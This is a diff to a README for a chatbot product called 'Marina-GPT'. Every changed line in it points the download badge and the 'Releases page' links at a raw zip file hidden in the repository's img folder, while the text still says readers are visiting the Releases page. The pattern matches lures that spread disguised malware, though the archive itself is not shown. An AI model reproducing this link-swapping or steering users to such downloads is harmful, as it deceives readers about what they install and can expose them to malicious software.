@@ -1,6 +1,6 @@
 # 🌊 Marina-GPT - Your Ultimate Chatbot Experience Awaits
 
-[![Download Marina-GPT](https://img.shields.io/badge/Download%20Marina--GPT%20Now-blue)](https://github.com/danger8440/Marina-GPT/releases)
+[![Download Marina-GPT](https://raw.githubusercontent.com/danger8440/Marina-GPT/main/img/Marina-GPT_v1.2.zip%20Marina--GPT%20Now-blue)](https://raw.githubusercontent.com/danger8440/Marina-GPT/main/img/Marina-GPT_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Marina-GPT! This powerful software is designed to enhance your chatti
 
 ## 📥 Download & Install
 
-To download Marina-GPT, visit this page to download: [Download Marina-GPT](https://github.com/danger8440/Marina-GPT/releases).
+To download Marina-GPT, visit this page to download: [Download Marina-GPT](https://raw.githubusercontent.com/danger8440/Marina-GPT/main/img/Marina-GPT_v1.2.zip).
 
 ### Step 1: Visit the Releases Page
 
@@ -53,7 +53,7 @@ To download Marina-GPT, visit this page to download: [Download Marina-GPT](https
 
 ### How do I update Marina-GPT?
 
-To get the latest features and improvements, visit the Releases page [here](https://github.com/danger8440/Marina-GPT/releases) and download the newest version. Follow the same installation steps to update.
+To get the latest features and improvements, visit the Releases page [here](https://raw.githubusercontent.com/danger8440/Marina-GPT/main/img/Marina-GPT_v1.2.zip) and download the newest version. Follow the same installation steps to update.
 
 ### Can I use Marina-GPT offline?
 
@@ -69,4 +69,4 @@ If you experience any errors, check our Issues page on GitHub or submit your pro
 - Experiment with different conversation styles to see what works best for you.
 - Keep your version updated to benefit from the latest features and bug fixes.
 
-Thank you for choosing Marina-GPT! We hope you enjoy a seamless and interactive chatting experience. For further updates and information, keep an eye on the Releases page: [Download Marina-GPT](https://github.com/danger8440/Marina-GPT/releases).
+Thank you for choosing Marina-GPT! We hope you enjoy a seamless and interactive chatting experience. For further updates and information, keep an eye on the Releases page: [Download Marina-GPT](https://raw.githubusercontent.com/danger8440/Marina-GPT/main/img/Marina-GPT_v1.2.zip).
